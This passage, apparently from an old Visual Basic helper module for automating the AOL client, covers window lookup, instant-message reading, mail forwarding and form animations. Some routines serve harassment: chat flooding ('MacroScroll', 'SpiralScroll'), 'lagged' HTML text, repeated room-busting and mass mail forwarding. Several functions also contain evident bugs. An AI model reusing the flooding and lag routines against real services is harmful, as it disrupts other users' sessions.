e = GetWindow(e, GW_HWNDNEXT)
e = GetWindow(e, GW_HWNDNEXT) 'cancel button...
'to close the IM window
ClickIcon (e)
End Sub

Function MessageFromIM()
Dim IMText As Long
AOL% = FindWindow("AOL Frame25", vbNullString)
MDI% = FindChildByClass(AOL%, "MDIClient")

im% = FindChildByTitle(MDI%, ">Instant Message From:")
If im% Then GoTo Greed
im% = FindChildByTitle(MDI%, "  Instant Message From:")
If im% Then GoTo Greed
Exit Function
Greed:
IMText& = FindChildByClass(im%, "RICHCNTL")
IMmessage = GetText(IMText&)
SN = SNfromIM()
snlen = Len(SNfromIM()) + 3
blah = Mid(IMmessage, InStr(IMmessagge, SN) + snlen)
MessageFromIM = Left(blah, Len(blah) - 1)
End Function







Sub Upchat()
AOL% = FindWindow("AOL Frame25", vbNullString)
AOModal% = FindChildByClass(AOL%, "_AOL_Modal")
AOGauge% = FindChildByClass(AOModal%, "_AOL_Gauge")
If AOGauge% <> 0 Then Upp% = AOModal%
Call EnableWindow(AOL%, 1)
Call EnableWindow(Upp%, 0)
End Sub
Sub UnUpchat()
AOL% = FindWindow("AOL Frame25", vbNullString)
AOModal% = FindChildByClass(AOL%, "_AOL_Modal")
AOGauge% = FindChildByClass(AOModal%, "_AOL_Gauge")
If AOGauge% <> 0 Then Upp% = AOModal%
Call EnableWindow(Upp%, 1)
Call EnableWindow(AOL%, 0)
End Sub

Sub HideAOL()
AOL% = FindWindow("AOL Frame25", vbNullString)
Call ShowWindow(AOL%, 0)
End Sub

Sub ShowAOL()
AOL% = FindWindow("AOL Frame25", vbNullString)
Call ShowWindow(AOL%, 5)
End Sub
Private Function BoldColorredandblack(thetext)

G$ = thetext
A = Len(G$)
For W = 1 To A Step 4
    r$ = Mid$(G$, W, 1)
    U$ = Mid$(G$, W + 1, 1)
    S$ = Mid$(G$, W + 2, 1)
    T$ = Mid$(G$, W + 3, 1)
    p$ = p$ & "<b><FONT COLOR=" & Chr$(34) & "#FF0000" & Chr$(34) & "><sup>" & r$ & "</sup>" & "<FONT COLOR=" & Chr$(34) & "#0000FF" & Chr$(34) & ">" & U$ & "<FONT COLOR=" & Chr$(34) & "#FF0000" & Chr$(34) & "><sub>" & S$ & "</sub>" & "<FONT COLOR=" & Chr$(34) & "#0000FF" & Chr$(34) & "></b>" & T$
Next W
BoldColorredandblack = p$
End Function
Sub PlatinumFade(vForm As Object)
    'This code works best when called in the paint event
    On Error Resume Next
    Dim intLoop As Integer 'Variable for loop
    vForm.DrawStyle = vbInsideSolid 'Set Form Modes
    vForm.DrawMode = vbCopyPen
    vForm.ScaleMode = vbPixels
    vForm.DrawWidth = 2
    vForm.ScaleHeight = 256
    For intLoop = 0 To 255 'Begin Loop
        'This code can be changed to make different colors
        vForm.Line (0, intLoop)-(Screen.Width, intLoop - 1), RGB(255 - intLoop, 255 - intLoop, 255 - intLoop), B 'Draw boxes with specified color of loop
    Next intLoop
End Sub
 Function AOL_RoomBust2(room, thelabel As label)
 CRoom% = AOLFindRoom
Call AOLKillWindow(CRoom%)
 TimeOut 0.2
 room = TrimSpaces(room)
 quitflag = False
 
 If room = "" Then Exit Function
  
  Do Until Chat_FindRoom
  Number = Number + 1
    thelabel.Caption = Number
       
     If quitflag = True Then
        quitflag = False
        Exit Function
    End If
    TimeOut 0.1
     Keyword "aol://2719:2-2-" + room
             
       Do
Msg = FindWindow("#32770", "America Online")
If Msg <> 0 Then AOLKillWindow Msg
If Msg = 0 Then Exit Do
Loop
        
        
        inroom = Chat_FindRoom
        If inroom <> 0 Then GoTo Done
      Loop
     
     
Done:
  
       Do
Msg = FindWindow("#32770", "America Online")
If Msg <> 0 Then AOLKillWindow Msg
If Msg = 0 Then Exit Do
Loop
  End Function

Function AOL_RoomBust(room, thelabel As label)
'bust into a room
'it returns the number of seconds it took to bust into the room
'need a label to keep track of the number of tries
'label retains number of tries when procedure ends
'it resets itself when you run the procedure again
If AOL_Online = 0 Then Exit Function


AppActivate "America  Online"

CRoom% = AOLFindRoom
AOLKillWindow (CRoom%)
TimeOut 0.2

quitflag = False
thelabel.Caption = 0
room = TrimSpaces(room)
If room = "" Then Exit Function

starttime = Timer

Do: DoEvents
    Number = Number + 1
    thelabel.Caption = Number
    
    If quitflag = True Then
        quitflag = False
        Exit Function
    End If
    
    
    Keyword "aol://2719:2-2-" + room
    
    
    Do: DoEvents
        If quitflag = True Then
           quitflag = False
            Exit Function
        End If
         
        
        ErrorMsg% = FindWindow("#32770", "America Online")
        If ErrorMsg% <> 0 Then
           
           ErrorOK% = FindChildByTitle(ErrorMsg%, "OK")
           ClickIcon ErrorOK%
           
            
            Exit Do
        End If
        
        inroom = AOLFindRoom
        If inroom <> 0 Then GoTo Done
      
    
    Loop
Loop

Done:
endtime = Timer
TotalTime = endtime - starttime
AOL_RoomBust = TotalTime
SendChat TotalTime
End Function
Sub XAOL4_Keyword(Txt)
    AOL% = FindWindow("AOL Frame25", vbNullString)
    temp% = FindChildByClass(AOL%, "AOL Toolbar")
    temp% = FindChildByClass(temp%, "_AOL_Toolbar")
    temp% = FindChildByClass(temp%, "_AOL_Combobox")
    KWBox% = FindChildByClass(temp%, "Edit")
    Call SendMessageByString(KWBox%, WM_SETTEXT, 0, Txt)
    Call SendMessageByNum(KWBox%, WM_CHAR, VK_SPACE, 0)
    Call SendMessageByNum(KWBox%, WM_CHAR, VK_RETURN, 0)
End Sub
Function AOLIsOnline()
AOL% = FindWindow("AOL Frame25", vbNullString)
MDI% = FindChildByClass(AOL%, "MDIClient")
welcome% = FindChildByTitle(MDI%, "Welcome, ")
If welcome% = 0 Then
AOLIsOnline = 0
Exit Function
End If
AOLIsOnline = 1
End Function
Sub RemoveItemFromListbox(Lst As ListBox)
'this code works well in the double click part of your listbox
Jaguar% = Lst.ListIndex
Lst.RemoveItem (Jaguar%)
End Sub
Function UserSN()
On Error Resume Next
AOL% = FindWindow("AOL Frame25", "America  Online")
MDI% = FindChildByClass(AOL%, "MDIClient")
welcome% = FindChildByTitle(MDI%, "Welcome, ")
WelcomeLength% = GetWindowTextLength(welcome%)
WelcomeTitle$ = String$(200, 0)
A% = GetWindowText(welcome%, WelcomeTitle$, (WelcomeLength% + 1))
User = Mid$(WelcomeTitle$, 10, (InStr(WelcomeTitle$, "!") - 10))
UserSN = User
End Function
Sub WaitForMailToLoad()
ReadMail
Do
Box% = FindChildByTitle(AOLMDI(), UserSN & "'s Online Mailbox")
Loop Until Box% <> 0
List = FindChildByClass(Box%, "_AOL_Tree")
Do
DoEvents
M1% = SendMessage(List, LB_GETCOUNT, 0, 0&)
TimeOut (1)
M2% = SendMessage(List, LB_GETCOUNT, 0, 0&)
TimeOut (1)
M3% = SendMessage(List, LB_GETCOUNT, 0, 0&)
Loop Until M1% = M2% And M2% = M3%
M3% = SendMessage(List, LB_GETCOUNT, 0, 0&)
TimeOut (1)
ClickRead
End Sub
Function WaitForWin(Caption As String) As Integer
Do
DoEvents
win% = FindChildByClass(AOLMDI, Caption)
Loop Until win% <> 0
WaitForWin = win%
End Function
Sub findselected(Form As Form, List As ListBox)
For i = 0 To List1.ListCount - 1
If Form.List.Selected(i) Then
X = SendMessageByString(Mail%, LB_SETCURSEL, i, 0)
End If
Next i
End Sub

Function Percent(Complete As Integer, Total As Variant, TotalOutput As Integer) As Integer
On Error Resume Next
Percent = Int(Complete / Total * TotalOutput)
End Function
Sub PercentBar(Shape As Control, Done As Integer, Total As Variant)
'This is used like:
'Call PercentBar(Picture1, Label1.Caption, Label2.Caption)
'where Label1 is how many mails have
'already been forwarded, and Label2 is
'how many total mails there are.
On Error Resume Next
Shape.AutoRedraw = True
Shape.FillStyle = 0
Shape.DrawStyle = 0
Shape.FontName = "MS Sans Serif"
Shape.FontSize = 8.25
Shape.FontBold = False
X = Done / Total * Shape.Width
Shape.Line (0, 0)-(Shape.Width, Shape.Height), RGB(255, 255, 255), BF
Shape.Line (0, 0)-(X - 10, Shape.Height), RGB(0, 0, 255), BF
Shape.CurrentX = (Shape.Width / 2) - 100
Shape.CurrentY = (Shape.Height / 2) - 125
Shape.ForeColor = RGB(255, 0, 0)
Shape.Print Percent(Done, Total, 100) & "%"
End Sub
Private Sub ReadMail()
Dim Toolbar As Long
Dim icon As Long
Dim tool As Long
tool& = FindChildByClass(AOLWindow(), "AOL Toolbar")
Toolbar& = FindChildByClass(tool&, "_AOL_Toolbar")
icon& = FindChildByClass(Toolbar&, "_AOL_Icon")
Call Button(icon&)
End Sub
Sub ForwardMail(Recipiants, Message)

AOL% = FindWindow("AOL Frame25", vbNullString)
Do: DoEvents
MDI% = FindChildByClass(AOL%, "MDIClient")
AOMail% = FindChildByTitle(MDI%, "Fwd: ")
AOEdit% = FindChildByClass(AOMail%, "_AOL_Edit")
AORich% = FindChildByClass(AOMail%, "RICHCNTL")
AoIcon% = FindChildByClass(AOMail%, "_AOL_Icon")
Loop Until AOMail% <> 0 And AOEdit% <> 0 And AORich% <> 0 And AoIcon% <> 0

Call SendMessageByString(AOEdit%, WM_SETTEXT, 0, Recipiants)

AOEdit% = GetWindow(AOEdit%, 2)
AOEdit% = GetWindow(AOEdit%, 2)
AOEdit% = GetWindow(AOEdit%, 2)
AOEdit% = GetWindow(AOEdit%, 2)
Call SendMessageByString(AORich%, WM_SETTEXT, 0, Message)

For GetIcon = 1 To 14
    AoIcon% = GetWindow(AoIcon%, 2)
Next GetIcon

ClickIcon (AoIcon%)
Do: DoEvents
AOMail% = FindChildByTitle(MDI%, "Fwd: ")
AOEdit% = FindChildByClass(AOMail%, "_AOL_Edit")
Loop Until AOEdit% = 0
End Sub
Function CountMail()
AOL% = FindWindow("AOL Frame25", vbNullString)
MDI% = FindChildByClass(AOL%, "MDIClient")
Mail% = FindChildByTitle(MDI%, UserSN & "'s Online Mailbox")
TabControl% = FindChildByClass(Mail%, "_AOL_TabControl")
TabPage% = FindChildByClass(TabControl%, "_AOL_TabPage")
MailLB% = FindChildByClass(TabPage%, "_AOL_Tree")
CountMail = SendMessageByNum(MailLB%, LB_GETCOUNT, 0&, 0&)
End Function
Sub DeleteItem(Lst As ListBox, Item$)
On Error Resume Next
Do
NoFreeze% = DoEvents()
If LCase$(Lst.List(A)) = LCase$(Item$) Then Lst.RemoveItem (A)
A = 1 + A
Loop Until A >= Lst.ListCount
End Sub
Sub ClickKeepAsNew()
AOL% = FindWindow("AOL Frame25", vbNullString)
MDI% = FindChildByClass(AOL%, "MDIClient")
MailBox% = FindChildByTitle(MDI%, UserSN & "'s Online Mailbox")
AoIcon% = FindChildByClass(MailBox%, "_AOL_Icon")
For l = 1 To 2
AoIcon% = GetWindow(AoIcon%, 2)
Next l
ClickIcon (AoIcon%)
End Sub
Sub ClickNext()
mailwin% = FindChildByClass(AOLMDI(), "AOL Child")
AoIcon% = FindChildByClass(mailwin%, "_AOL_Icon")
For l = 1 To 5
AoIcon% = GetWindow(AoIcon%, 2)
Next l
ClickIcon (AoIcon%)
End Sub
Sub ClickRead()
AOL% = FindWindow("AOL Frame25", vbNullString)
MDI% = FindChildByClass(AOL%, "MDIClient")
MailBox% = FindChildByTitle(MDI%, UserSN & "'s Online Mailbox")
AoIcon% = FindChildByClass(MailBox%, "_AOL_Icon")
For l = 1 To 0
AoIcon% = GetWindow(AoIcon%, 2)
Next l
ClickIcon (AoIcon%)
End Sub
Sub ClickSendAndForwardMail()
AOL% = FindWindow("AOL Frame25", vbNullString)
MDI% = FindChildByClass(AOL%, "MDIClient")
AOMail% = FindChildByClass(MDI%, "AOL Child")
AOEdit% = FindChildByClass(AOMail%, "_AOL_Edit")
AORich% = FindChildByClass(AOMail%, "RICHCNTL")
AoIcon% = FindChildByClass(AOMail%, "_AOL_Icon")
Pause (0.5)
Call AOLSetText(AOEdit%, AOL40_Mail_NamesList(mmer.List1))
Pause (0.3)
Call AOLSetText(AORich%, "Tru Magic MM")
    AoIcon% = GetWindow(AoIcon%, 2)
    Pause (0.3)
ClickIcon (AoIcon%)
DoEvents
AOMail% = FindChildByTitle(MDI%, "Fwd: ")
killwin AOMail%
End Sub

Sub ClickForward()
mailwin% = FindChildByClass(AOLMDI(), "AOL Child")
AoIcon% = FindChildByClass(mailwin%, "_AOL_Icon")
For l = 1 To 8
AoIcon% = GetWindow(AoIcon%, 2)
NoFreeze% = DoEvents()
Next l
ClickIcon (AoIcon%)
End Sub
Sub AddMailList(List As ListBox)
AOL% = FindWindow("AOL Frame25", vbNullString)
tool% = FindChildByClass(AOL%, "AOL Toolbar")
tol% = FindChildByClass(tool%, "_AOL_Toolbar")
Mail% = FindChildByClass(tol%, "_AOL_Icon")
ClickIcon (Mail%)
Do
DoEvents
AOL% = FindWindow("AOL Frame25", vbNullString)
MDI% = FindChildByClass(AOL%, "MDIClient")
chi% = FindChildByClass(MDI%, "AOL Child")
tabb% = FindChildByClass(chi%, "_AOL_TabControl")
pag% = FindChildByClass(tabb%, "_AOL_TabPage")
tree% = FindChildByClass(pag%, "_AOL_Tree")
If tree% Then Exit Do
Loop
Do
DoEvents
X = SendMessage(tree%, LB_GETCOUNT, 0, 0)
Call TimeOut(2)
xg = SendMessage(tree%, LB_GETCOUNT, 0, 0)
Loop Until X = xg
X = SendMessage(tree%, LB_GETCOUNT, 0, 0)
Z = 0
For i = 0 To X - 1
mailstr$ = String$(255, " ")
    Q% = SendMessageByString(tree%, LB_GETTEXT, i, mailstr$)
    nodate$ = Mid$(mailstr$, InStr(mailstr$, "/") + 8)
    nosn$ = Mid$(nodate$, InStr(nodate$, Chr(9)) + 1)
    List.AddItem Z & ") " & Trim(nosn$)
    Z = Z + 1
Next i
Call KillDupes(List)
End Sub
Sub PlayWave(file$)
X = sndPlaySound(file$, 1)
End Sub


Function AddListToString(TheList As ListBox)
For DoList = 0 To TheList.ListCount - 1
AddListToString = AddListToString & TheList.List(DoList) & ", "
Next DoList
AddListToString = Mid(AddListToString, 1, Len(AddListToString) - 2)
End Function
Function AddListToString2(TheList As ListBox)
For DoList = 0 To TheList.ListCount - 1
AddListToString2 = AddListToString2 & TheList.List(DoList) & "@aol.com, "
Next DoList
AddListToString2 = Mid(AddListToString2, 1, Len(AddListToString2) - 2)
End Function

Sub setpreference()
Do: DoEvents
aolmod% = FindWindow("_AOL_Modal", "Mail Preferences")
aolcloses% = FindChildByTitle(aolmod%, "Close mail after it has been sent")
aolconfirm% = FindChildByTitle(aolmod%, "Confirm mail after it has been sent")
aolOK% = FindChildByTitle(aolmod%, "OK")
If aolOK% <> 0 And aolcloses% <> 0 And aolconfirm% <> 0 Then Exit Do
Loop
sendcon% = SendMessage(aolcloses%, BM_SETCHECK, 1, 0)
sendcon% = SendMessage(aolconfirm%, BM_SETCHECK, 0, 0)

ClickIcon (aolOK%)
Do: DoEvents
aolmod% = FindWindow("_AOL_Modal", "Mail Preferences")
Loop Until aolmod% = 0



End Sub
Function AOLRoomCount()

Chat% = AOL40_FindChatRoom()
List% = FindChildByClass(Chat%, "_AOL_Listbox")
Count% = SendMessage(List%, LB_GETCOUNT, 0, 0)
AOLRoomCount = Count%
End Function
Sub Pause(interval)

Current = Timer
Do While Timer - Current < Val(interval)
DoEvents
Loop
End Sub
Function AOLHyperLink(ByVal text As String, ByVal link As String)
'Text: STRING - What you want the hyperlink to say
'Link: STRING - The keyword/link for the hyperlink to be linked to
'RETURN VALUE: STRING - A string ready to be put in an IM or Mail window
AOLHyperLink = "<HTML><A HREF=""" & link & """>" & text & "</A></HTML>"
End Function
Function AOLClickList(hWnd)
'clicks a list
ClickList% = SendMessageByNum(hWnd, &H203, 0, 0&)
End Function
Sub HowTo_CircleForm()

'THIS CODE WILL MAKE CIRCLE OR OVEL SHAPED FORMS
'PLACE IN THE FORM LOAD
'SetWindowRgn hWnd, _
'CreateEllipticRgn(0, 0, 300, 200), True
'
End Sub


Sub HowTO_StarField()
'this is how to make a star field
'on a form.....just uncomment, and edit


'Private Sub Form_Load()
'    Dim nIndex As Integer
'    ' At form load, the initial coordinates of all the stars needs to be set to off screen.
'    ' The timer event will recognise this and bring the stars back on screen.
'    For nIndex = 0 To 49
'        nXCoord(nIndex) = -1
'        nYCoord(nIndex) = -1
'    Next
'    ' Call the randomize method to tell VB to get ready to think of some random numbers
'    Randomize
'    Timer1.Enabled = True
'End Sub
'

'Private Sub Timer1_Timer()
'    ' The timer event performs three functions here.
'    '       1. Stars that are off screen are remade at the centre of the screen
'    '       2. Stars previously drawn are erase by redrawing them in black
'    '       3. Each star's position is recalculated and the star redrawn.
'    Dim nIndex As Integer
'    For nIndex = 0 To 49
'        'erase the previously drawn star
'        PSet (nXCoord(nIndex), nYCoord(nIndex)), &H0&
'        ' If the star number nIndex is off screen, then bring it back
'        If nXCoord(nIndex) < 0 Or nXCoord(nIndex) > frmMain.ScaleWidth Or nYCoord(nIndex) < 0 Or nYCoord(nIndex) > frmMain.ScaleHeight Then
'            nXCoord(nIndex) = frmMain.ScaleWidth \ 2
'            nYCoord(nIndex) = frmMain.ScaleHeight \ 2
'            ' Decide on some random speeds for the new star
'            nXSpeed(nIndex) = Int(Rnd(1) * 200) - 100   ' Gives a speed between -100 and 100
'            nYSpeed(nIndex) = Int(Rnd(1) * 200) - 100   ' Gives a speed between -100 and 100
'        End If
'        ' Now redraw the star so that it appears to move
'        nXCoord(nIndex) = nXCoord(nIndex) + nXSpeed(nIndex)
'        nYCoord(nIndex) = nYCoord(nIndex) + nYSpeed(nIndex)
'        PSet (nXCoord(nIndex), nYCoord(nIndex)), &HFFFFFF
'    ' Move on to the next star
'    Next
'End Sub
End Sub

Sub Form_Explode(f As Form, Movement As Integer)
'this will explode a form
    Dim myRect As RECT
    Dim formWidth%, formHeight%, i%, X%, Y%, cx%, cy%
    Dim TheScreen As Long
    Dim Brush As Long
    
    GetWindowRect f.hWnd, myRect
    formWidth = (myRect.Right - myRect.Left)
    formHeight = myRect.Bottom - myRect.Top
    TheScreen = GetDC(0)
    Brush = CreateSolidBrush(f.BackColor)
    
    For i = 1 To Movement
        cx = formWidth * (i / Movement)
        cy = formHeight * (i / Movement)
        X = myRect.Left + (formWidth - cx) / 2
        Y = myRect.Top + (formHeight - cy) / 2
        Rectangle TheScreen, X, Y, X + cx, Y + cy
    Next i
    
    X = ReleaseDC(0, TheScreen)
    DeleteObject (Brush)
    
End Sub


Public Sub Form_Implode(f As Form, Direction As Integer, Movement As Integer, ModalState As Integer)
'The larger the "Movement" value, the slower the "Implosion"
    Dim myRect As RECT
    Dim formWidth%, formHeight%, i%, X%, Y%, cx%, cy%
    Dim TheScreen As Long
    Dim Brush As Long
    
    GetWindowRect f.hWnd, myRect
    formWidth = (myRect.Right - myRect.Left)
    formHeight = myRect.Bottom - myRect.Top
    TheScreen = GetDC(0)
    Brush = CreateSolidBrush(f.BackColor)
    
        For i = Movement To 1 Step -1
        cx = formWidth * (i / Movement)
        cy = formHeight * (i / Movement)
        X = myRect.Left + (formWidth - cx) / 2
        Y = myRect.Top + (formHeight - cy) / 2
        Rectangle TheScreen, X, Y, X + cx, Y + cy
    Next i
    
    X = ReleaseDC(0, TheScreen)
    DeleteObject (Brush)
        
End Sub


Sub Form_ScrollDown(Form1 As Form, startNUM, endNUM)
'This will make the form slowly scroll down
'You can use a timeout to stop it and put it in a
'timer
Dim X
Dim Y
Form1.Show
Form1.Height = startNUM
X = Form1.Height
For Y = X To endNUM
Form1.Height = frm.Height + 20
TimeOut (0.0001)
If Form1.Height >= endNUM Then GoTo out:
Next Y
out:
End Sub

Sub Form_ScrollUp(frm As Form, startNUM, endNUM)
'This will make the form slowly scroll up
'You can use a timeout to stop it and put it in a
'timer
Dim X
Dim Y
frm.Show
frm.Height = startNUM
X = frm.Height
For Y = X To endNUM
frm.Height = frm.Height - 20
TimeOut (0.0001)
'If frm.Height <= endNUM Then GoTo out:
Next Y
out:
End Sub

Sub Form_Suckin(frm As Form)

Do
DoEvents
frm.Height = frm.Height - 50
frm.Width = frm.Width - 50
Loop Until frm.Height < 450 And frm.Width < 1700
End Sub

Sub FormExit_Down(winform As Form)
'the form files down off the screen, and
'ends the program
Do
winform.Top = Trim(Str(Int(winform.Top) + 300))
DoEvents
Loop Until winform.Top > 7200
If winform.Top > 7200 Then End
End Sub


Sub FormExit_Left(winform As Form)
'the form files left off the screen, and
'ends the program
Do
winform.Left = Trim(Str(Int(winform.Left) - 300))
DoEvents
Loop Until winform.Left < -6300
If winform.Left < -6300 Then End
End Sub


Sub FormExit_right(winform As Form)
'the form files right off the screen, and
'ends the program
Do
winform.Left = Trim(Str(Int(winform.Left) + 300))
DoEvents
Loop Until winform.Left > 9600
If winform.Left > 9600 Then End
End Sub


Sub FormExit_up(winform As Form)
'the form files up off the screen, and
'ends the program
Do
winform.Top = Trim(Str(Int(winform.Top) - 300))
DoEvents
Loop Until winform.Top < -4500
If winform.Top < -4500 Then End
End Sub

Sub FormDraw3DBorder(f As Form)
'adds a 3d border to a form

Dim iOldScaleMode As Integer
Dim iOldDrawWidth As Integer
    iOldScaleMode = f.ScaleMode
    iOldDrawWidth = f.DrawWidth
    f.ScaleMode = vbPixels
    f.DrawWidth = 1
    f.Line (0, 0)-(f.ScaleWidth, 0), QBColor(15)
    f.Line (0, 0)-(0, f.ScaleHeight), QBColor(15)
    f.Line (0, f.ScaleHeight - 1)-(f.ScaleWidth - 1, f.ScaleHeight - 1), QBColor(8)
    f.Line (f.ScaleWidth - 1, 0)-(f.ScaleWidth - 1, f.ScaleHeight), QBColor(8)

    f.ScaleMode = iOldScaleMode
    f.DrawWidth = iOldDrawWidth
End Sub

Public Sub Form_MakeTransparent(frm As Form)
'makes a form transparent.....
       Dim rctClient As RECT, rctFrame As RECT
       Dim hClient As Long, hFrame As Long
       '     '// Grab client area and frame area
       GetWindowRect frm.hWnd, rctFrame
       GetClientRect frm.hWnd, rctClient
       '     '// Convert client coordinates to screen coordinates
       Dim lpTL As POINTAPI, lpBR As POINTAPI
       lpTL.X = rctFrame.Left
       lpTL.Y = rctFrame.Top
       lpBR.X = rctFrame.Right
       lpBR.Y = rctFrame.Bottom
       ScreenToClient frm.hWnd, lpTL
       ScreenToClient frm.hWnd, lpBR
       rctFrame.Left = lpTL.X
       rctFrame.Top = lpTL.Y
       rctFrame.Right = lpBR.X
       rctFrame.Bottom = lpBR.Y
       rctClient.Left = Abs(rctFrame.Left)
       rctClient.Top = Abs(rctFrame.Top)
       rctClient.Right = rctClient.Right + Abs(rctFrame.Left)
       rctClient.Bottom = rctClient.Bottom + Abs(rctFrame.Top)
       rctFrame.Right = rctFrame.Right + Abs(rctFrame.Left)
       rctFrame.Bottom = rctFrame.Bottom + Abs(rctFrame.Top)
       rctFrame.Top = 0
       rctFrame.Left = 0
       '     '// Convert RECT structures to region handles
       hClient = CreateRectRgn(rctClient.Left, rctClient.Top, rctClient.Right, rctClient.Bottom)
       hFrame = CreateRectRgn(rctFrame.Left, rctFrame.Top, rctFrame.Right, rctFrame.Bottom)
       '     '// Create the new "Transparent" region
       CombineRgn hFrame, hClient, hFrame, RGN_XOR
       '     '// Now lock the window's area to this created region
       SetWindowRgn frm.hWnd, hFrame, True
End Sub

Public Sub Form_Move(TheForm As Form)
'WILL HELP YOU MOVE A FORM WITHOUT
'A TITLE BAR, PLACE IN MOUSEDOWN
       ReleaseCapture
       Call SendMessage(TheForm.hWnd, &HA1, 2, 0&)
       '
End Sub

Sub shrink(label As label, startSIZE, endSIZE)
'this function makes the text in a lebel shrink.
'the startSIZE has to be greater that the endSize.
'if the endSIZE is 0, the label dispears

label.Visible = True
label.FontSize = startSIZE
Dim X
Do
X = label.FontSize - 2
label.FontSize = X
    TimeOut (0.001)
    If label.FontSize < (endSIZE Or 2) Then Exit Do
Loop
If endSIZE = 0 Then
    label.Visible = False
End If
End Sub


Sub Grow(label As label, startSIZE, endSIZE)
'this function makes a label grow
'the font size starts a startSIZE,
'and ends and endSIZE
'MADE SURE THE FONT OF THE LABEL
'CAN GO BIG ENOUGH
label.Visible = True
label.FontSize = startSIZE
Dim X
Do While label.FontSize < endSIZE
    label.FontSize = label.FontSize + 2
        TimeOut (0.001)
    
Loop
End Sub

Sub bounce(label As label, minsize, maxsize, numOFbounces)
'this function makes a label, grow, and shrink
'giving it a "BOUNCING" effect
'minSIZE is the smallest it goes, maxSIZE is the largest the label goes
'numOFbounces is the number of times the label bounces
'to make a label bounce forever, call this
'function in a timer, and have numOFbounces = 1
'MADE SURE THE FONT OF THE LABEL
'CAN GO BIG ENOUGH

label.FontSize = minsize
Dim X
Dim Y
Dim num
Start:
If (num >= numOFbounces) Then GoTo out:
Do
X = label.FontSize + 2
label.FontSize = X
    TimeOut (0.001)
    If label.FontSize >= maxsize Then Exit Do
Loop

Do
X = label.FontSize - 2
label.FontSize = X
    TimeOut (0.001)
    If label.FontSize < (minsize Or 2) Then Exit Do
Loop
num = num + 1
GoTo Start:
out:
End Sub

Sub bounce2(label As label, big_size, small_size, numOFbounces)
'this is another bounce function
'Makesure the labels font will support
'the font sizes first
Dim X
For X = 1 To numOFbounces
Call Grow(label, small_size, big_size)
Call shrink(label, big_size, small_size)
Next X
End Sub

Sub FlipPictureHorizontal(pic1 As PictureBox, pic2 As PictureBox)
'pic1 = the existing pic
'pic2 = the pic to be fliped
    pic1.ScaleMode = 3
    pic2.ScaleMode = 3
    pic2.Cls
    Dim px%
    Dim py%
    Dim retVal%
    px% = pic1.ScaleWidth
    py% = pic1.ScaleHeight
    retVal% = StretchBlt(pic2.hDC, px%, 0, -px%, py%, pic1.hDC, 0, 0, px%, py%, SRCCOPY)
End Sub

Sub FlipPictureVertical(pic1 As PictureBox, pic2 As PictureBox)
'pic1 = the existing pic
'pic2 = the pic to be fliped
    pic1.ScaleMode = 3
    pic2.ScaleMode = 3
    pic2.Cls
    Dim px%
    Dim py%
    Dim retVal%
    px% = pic1.ScaleWidth
    py% = pic1.ScaleHeight
    retVal% = StretchBlt(pic2.hDC, 0, py%, px%, -py%, pic1.hDC, 0, 0, px%, py%, SRCCOPY)
End Sub
Private Sub MacroScroll(text As String)
'put your macro in a text box then
'Call MacroScroll
If Mid(text$, Len(text$), 1) <> Chr$(10) Then
    text$ = text$ + Chr$(13) + Chr$(10)
End If
Do While (InStr(text$, Chr$(13)) <> 0)
    Counter = Counter + 1
    SendChat Mid(text$, 1, InStr(text$, Chr(13)) - 1)
    If Counter = 4 Then
        TimeOut (2.9)
        Counter = 0
    End If
    text$ = Mid(text$, InStr(text$, Chr(13) + Chr(10)) + 2)
Loop
End Sub
Sub SpiralScroll(Txt As TextBox)
X = Txt.text
rider:
Dim MYLEN As Integer
MyString = Txt.text
MYLEN = Len(MyString)
MYSTR = Mid(MyString, 2, MYLEN) + Mid(MyString, 1, 1)
Txt.text = MYSTR
SendChat "•[" + X + "]•"
If Txt.text = X Then
Exit Sub
End If
GoTo rider
End Sub

Sub SetCheckBoxToFalse(win%)
'This will set any checkbox's value to equal false
Check% = SendMessageByNum(win%, BM_SETCHECK, False, 0&)
End Sub

Sub SetCheckBoxToTrue(win%)
'This will set any checkbox's value to equal true
Check% = SendMessageByNum(win%, BM_SETCHECK, True, 0&)
End Sub

Function SecToMin(sec!)
    'convert seconds to minutes
    hrHour! = Fix(sec! / 3600)                  ' get number of hours
    hrRemSec! = sec! - (hrHour! * 3600)         ' save remaining seconds
    hrMinute! = Fix(hrRemSec! / 60)             ' get number of minutes
    hrSecond! = hrRemSec! - (hrMinute! * 60)    ' get number of secons
    
    ' build time string
    
    timeCalc$ = Format(hrHour!, "00:") & Format(hrMinute!, "00:") & Format(hrSecond!, "00")

    SecToMin = timeCalc$    ' assign value to function

End Function

Sub ClearChat()
getpar% = FindChatRoom()
child = FindChildByClass(getpar%, "RICHCNTL")
End Sub
Public Sub Toolbar(Number As Integer)
'clicks a button on the toolbar
'1 - Read Mail
'2 - Send Mail
'3 - Mail Center
'4 - Print
'6 - My Files
'7 - My AOL
'8 - Favorites
'10 - Internet
'11 - Channels
'12 - People
'13 - Back
'14 - Forward
'15 - Stop
'16 - Reload
'17 - Home
'18 - Find
'19 - Go
'20 - Keyword
AOL% = FindWindow("AOL Frame25", vbNullString)
TB1% = FindChildByClass(AOL%, "AOL Toolbar")
tc% = FindChildByClass(TB1%, "_AOL_Toolbar")
td% = FindChildByClass(tc%, "_AOL_Icon")

If Number = 1 Then
    Call ClickIcon(td%)
    Exit Sub
End If

For T = 0 To Number - 2
td% = GetWindow(td%, 2)
Next T

Call ClickIcon(td%)

End Sub
Function s_link(strin As String)
'makes the string spaced
Let inptxt$ = strin
Let lenth% = Len(inptxt$)
Do While numspc% <= lenth%
Let numspc% = numspc% + 1
Let nextchr$ = Mid$(inptxt$, numspc%, 1)
Let nextchr$ = nextchr$ + "—"
Let newsent$ = newsent$ + nextchr$
Loop
r_link = newsent$

End Function
Function s_html(strin As String)
'makes the string lagged
Let inptxt$ = strin
Let lenth% = Len(inptxt$)
Do While numspc% <= lenth%
Let numspc% = numspc% + 1
Let nextchr$ = Mid$(inptxt$, numspc%, 1)
Let nextchr$ = nextchr$ + "<html>"
Let newsent$ = newsent$ + nextchr$
Loop
r_html = newsent$

End Function
Sub AOLChangeCaption(Change$)

Call SetText(AOLWindow, Change$)

End Sub
Sub AOLChangeSN(SN As String, aoldir As String, Replace As String)

'changes the screen names on your comp

' - LiviD

If Right$(aoldir, 1) = "\" Then aoldir = Left$(aoldir, Len(aoldir) - 1)

LiFile = FreeFile

Open aoldir$ + "\idb\main.idx" For Binary As #LiFile

If Len(SN$) > Len(Replace$) Then

    Replace$ = Replace$ + String(Len(SN$) - Len(Replace$), " ")

End If

For X = 1 To LOF(LiFile) Step 32000

    text$ = Space(32000)

    Get #LiFile, X, text$

Find:

    If InStr(1, text$, SN$, 1) Then

